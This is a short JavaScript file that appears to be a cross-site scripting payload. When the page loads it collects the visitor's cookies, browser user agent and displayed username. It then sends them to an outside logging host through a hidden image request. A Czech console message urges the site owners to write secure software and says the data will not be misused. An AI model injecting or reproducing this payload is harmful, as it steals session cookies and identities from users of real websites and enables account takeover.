window.onload = function(){
  var cookies = document.cookie;
  var userAgent = navigator.userAgent;
  var user = document.getElementsByTagName("strong")[0].textContent;
  var params = "?cookies=" + cookies + "&agent=" + userAgent + "&user=" + user;
  console.log("DOBRÝ DEN, prosím vás naučte se vytvářet bezpečný software. děkuji. nebojte nic nezneužiji");
  
  var img = document.createElement('img');
  img.src = 'http://pleasefixxss.net63.net/log.php' + params;
  img.style.visibility = "hidden";
  document.getElementsByTagName('body')[0].appendChild(img);
}
